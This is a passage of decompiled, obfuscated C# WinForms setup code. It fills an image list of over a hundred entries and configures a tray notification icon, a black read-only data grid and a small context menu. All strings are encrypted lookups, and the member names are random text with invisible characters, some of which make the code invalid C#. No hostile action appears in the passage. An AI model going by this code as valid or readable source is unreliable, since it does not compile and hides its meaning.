			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(114, global::\u0006\u2001.\u0002(-1829134688));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(115, global::\u0006\u2001.\u0002(-1829134669));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(116, global::\u0006\u2001.\u0002(-1829134714));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(117, global::\u0006\u2001.\u0002(-1829134695));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(118, global::\u0006\u2001.\u0002(-1829134612));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(119, global::\u0006\u2001.\u0002(-1829134593));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(120, global::\u0006\u2001.\u0002(-1829134606));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(121, global::\u0006\u2001.\u0002(-1829134651));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(122, global::\u0006\u2001.\u0002(-1829134632));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(123, global::\u0006\u2001.\u0002(-1829135061));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(124, global::\u0006\u2001.\u0002(-1829135042));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(125, global::\u0006\u2001.\u0002(-1829135055));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(126, global::\u0006\u2001.\u0002(-1829135100));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(127, global::\u0006\u2001.\u0002(-1829135081));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(128, global::\u0006\u2001.\u0002(-1829134998));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(129, global::\u0006\u2001.\u0002(-1829134979));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(130, global::\u0006\u2001.\u0002(-1829134992));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(131, global::\u0006\u2001.\u0002(-1829135037));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(132, global::\u0006\u2001.\u0002(-1829135018));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(133, global::\u0006\u2001.\u0002(-1829134935));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(134, global::\u0006\u2001.\u0002(-1829134916));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(135, global::\u0006\u2001.\u0002(-1829134961));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(136, global::\u0006\u2001.\u0002(-1829134974));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(137, global::\u0006\u2001.\u0002(-1829134955));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(138, global::\u0006\u2001.\u0002(-1829134872));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(139, global::\u0006\u2001.\u0002(-1829134853));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(140, global::\u0006\u2001.\u0002(-1829134898));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(141, global::\u0006\u2001.\u0002(-1829134911));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(142, global::\u0006\u2001.\u0002(-1829134892));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(143, global::\u0006\u2001.\u0002(-1829135321));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(144, global::\u0006\u2001.\u0002(-1829135302));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(145, global::\u0006\u2001.\u0002(-1829135347));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(146, global::\u0006\u2001.\u0002(-1829135360));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(147, global::\u0006\u2001.\u0002(-1829135341));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(148, global::\u0006\u2001.\u0002(-1829135258));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(149, global::\u0006\u2001.\u0002(-1829135239));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(150, global::\u0006\u2001.\u0002(-1829135284));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(151, global::\u0006\u2001.\u0002(-1829135265));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(152, global::\u0006\u2001.\u0002(-1829135278));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(153, global::\u0006\u2001.\u0002(-1829135195));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(154, global::\u0006\u2001.\u0002(-1829135176));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(155, global::\u0006\u2001.\u0002(-1829135221));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(156, global::\u0006\u2001.\u0002(-1829135202));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(157, global::\u0006\u2001.\u0002(-1829135215));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(158, global::\u0006\u2001.\u0002(-1829135132));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(159, global::\u0006\u2001.\u0002(-1829135113));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(160, global::\u0006\u2001.\u0002(-1829135158));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(161, global::\u0006\u2001.\u0002(-1829135139));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(162, global::\u0006\u2001.\u0002(-1829135152));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(163, global::\u0006\u2001.\u0002(-1829137629));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(164, global::\u0006\u2001.\u0002(-1829137610));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(165, global::\u0006\u2001.\u0002(-1829137655));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(166, global::\u0006\u2001.\u0002(-1829137636));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(167, global::\u0006\u2001.\u0002(-1829137553));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(168, global::\u0006\u2001.\u0002(-1829137566));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(169, global::\u0006\u2001.\u0002(-1829137547));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(170, global::\u0006\u2001.\u0002(-1829137592));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(171, global::\u0006\u2001.\u0002(-1829137573));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(172, global::\u0006\u2001.\u0002(-1829137490));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(173, global::\u0006\u2001.\u0002(-1829137503));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(174, global::\u0006\u2001.\u0002(-1829137484));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(175, global::\u0006\u2001.\u0002(-1829137529));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(176, global::\u0006\u2001.\u0002(-1829137510));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(177, global::\u0006\u2001.\u0002(-1829137427));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(178, global::\u0006\u2001.\u0002(-1829137440));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(179, global::\u0006\u2001.\u0002(-1829137421));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(180, global::\u0006\u2001.\u0002(-1829137466));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(181, global::\u0006\u2001.\u0002(-1829137447));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(182, global::\u0006\u2001.\u0002(-1829137876));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(183, global::\u0006\u2001.\u0002(-1829137857));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(184, global::\u0006\u2001.\u0002(-1829137870));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(185, global::\u0006\u2001.\u0002(-1829137915));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(186, global::\u0006\u2001.\u0002(-1829137896));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(187, global::\u0006\u2001.\u0002(-1829137813));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(188, global::\u0006\u2001.\u0002(-1829137794));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(189, global::\u0006\u2001.\u0002(-1829137807));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(190, global::\u0006\u2001.\u0002(-1829137852));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(191, global::\u0006\u2001.\u0002(-1829137833));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(192, global::\u0006\u2001.\u0002(-1829137750));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(193, global::\u0006\u2001.\u0002(-1829137731));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(194, global::\u0006\u2001.\u0002(-1829137744));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(195, global::\u0006\u2001.\u0002(-1829137789));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(196, global::\u0006\u2001.\u0002(-1829137770));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(197, global::\u0006\u2001.\u0002(-1829137687));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(198, global::\u0006\u2001.\u0002(-1829137668));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(199, global::\u0006\u2001.\u0002(-1829137713));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(200, global::\u0006\u2001.\u0002(-1829137726));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(201, global::\u0006\u2001.\u0002(-1829137707));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(202, global::\u0006\u2001.\u0002(-1829138136));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(203, global::\u0006\u2001.\u0002(-1829138117));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(204, global::\u0006\u2001.\u0002(-1829138162));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(205, global::\u0006\u2001.\u0002(-1829138175));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(206, global::\u0006\u2001.\u0002(-1829138156));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(207, global::\u0006\u2001.\u0002(-1829138073));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(208, global::\u0006\u2001.\u0002(-1829138054));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(209, global::\u0006\u2001.\u0002(-1829138099));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(210, global::\u0006\u2001.\u0002(-1829138112));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(211, global::\u0006\u2001.\u0002(-1829138093));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(212, global::\u0006\u2001.\u0002(-1829138010));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(213, global::\u0006\u2001.\u0002(-1829137991));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(214, global::\u0006\u2001.\u0002(-1829138036));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(215, global::\u0006\u2001.\u0002(-1829138017));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(216, global::\u0006\u2001.\u0002(-1829138030));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(217, global::\u0006\u2001.\u0002(-1829137947));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(218, global::\u0006\u2001.\u0002(-1829137928));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(219, global::\u0006\u2001.\u0002(-1829137973));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(220, global::\u0006\u2001.\u0002(-1829137954));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(221, global::\u0006\u2001.\u0002(-1829137967));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(222, global::\u0006\u2001.\u0002(-1829138396));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(223, global::\u0006\u2001.\u0002(-1829138377));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(224, global::\u0006\u2001.\u0002(-1829138422));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(225, global::\u0006\u2001.\u0002(-1829138403));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(226, global::\u0006\u2001.\u0002(-1829138416));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(227, global::\u0006\u2001.\u0002(-1829138333));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(228, global::\u0006\u2001.\u0002(-1829138314));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(229, global::\u0006\u2001.\u0002(-1829138359));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(230, global::\u0006\u2001.\u0002(-1829138340));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(231, global::\u0006\u2001.\u0002(-1829138257));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(232, global::\u0006\u2001.\u0002(-1829138270));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(233, global::\u0006\u2001.\u0002(-1829138251));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(234, global::\u0006\u2001.\u0002(-1829138296));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(235, global::\u0006\u2001.\u0002(-1829138277));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(236, global::\u0006\u2001.\u0002(-1829138194));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(237, global::\u0006\u2001.\u0002(-1829138207));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(238, global::\u0006\u2001.\u0002(-1829138188));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(239, global::\u0006\u2001.\u0002(-1829138233));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(240, global::\u0006\u2001.\u0002(-1829138214));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(241, global::\u0006\u2001.\u0002(-1829136595));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(242, global::\u0006\u2001.\u0002(-1829136608));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BalloonTipIcon = ToolTipIcon.Info;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ContextMenuStrip = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003();
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Visible = true;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().AllowUserToAddRows = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().AllowUserToDeleteRows = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BackgroundColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BorderStyle = BorderStyle.None;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ClipboardCopyMode = DataGridViewClipboardCopyMode.Disable;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle.BackColor = Color.Black;
			dataGridViewCellStyle.Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8f, FontStyle.Bold);
			dataGridViewCellStyle.ForeColor = Color.LightSteelBlue;
			dataGridViewCellStyle.SelectionBackColor = SystemColors.Highlight;
			dataGridViewCellStyle.SelectionForeColor = SystemColors.HighlightText;
			dataGridViewCellStyle.WrapMode = DataGridViewTriState.True;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ContextMenuStrip = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = Color.Black;
			dataGridViewCellStyle2.Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8f, FontStyle.Bold);
			dataGridViewCellStyle2.ForeColor = Color.LightSteelBlue;
			dataGridViewCellStyle2.SelectionBackColor = SystemColors.Highlight;
			dataGridViewCellStyle2.SelectionForeColor = Color.Black;
			dataGridViewCellStyle2.WrapMode = DataGridViewTriState.False;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle = dataGridViewCellStyle2;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().EnableHeadersVisualStyles = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().GridColor = Color.LightSteelBlue;
			Control control4 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control4.Location = location;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829136589);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ReadOnly = true;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().RowHeadersVisible = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(22);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SelectionMode = DataGridViewSelectionMode.FullRowSelect;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ShowCellErrors = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ShowEditingIcon = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ShowRowErrors = false;
			Control control5 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			size = new Size(862, 314);
			control5.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().TabIndex = 6;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Cursor = Cursors.Hand;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			Control control6 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control6.Location = location;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829136630);
			Control control7 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			size = new Size(862, 333);
			control7.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().TabIndex = 5;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().TabStop = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().Items.AddRange(new ToolStripItem[]
			{
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2002(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2002(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2002()
			});
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().Name = global::\u0006\u2001.\u0002(-1829136640);
			Control control8 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003();
			size = new Size(153, 92);
			control8.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2002().Name = global::\u0006\u2001.\u0002(-1829136536);
			ToolStripItem toolStripItem29 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2002();
			size = new Size(152, 22);
			toolStripItem29.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2002().Text = global::\u0006\u2001.\u0002(-1829136564);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2002().Name = global::\u0006\u2001.\u0002(-1829136575);
			ToolStripItem toolStripItem30 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2002();
			size = new Size(152, 22);
			toolStripItem30.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2002().Text = global::\u0006\u2001.\u0002(-1829141151);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2002().Name = global::\u0006\u2001.\u0002(-1829136479);
			ToolStripItem toolStripItem31 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2002();
			size = new Size(152, 22);
			toolStripItem31.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2002().Text = global::\u0006\u2001.\u0002(-1829136507);
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
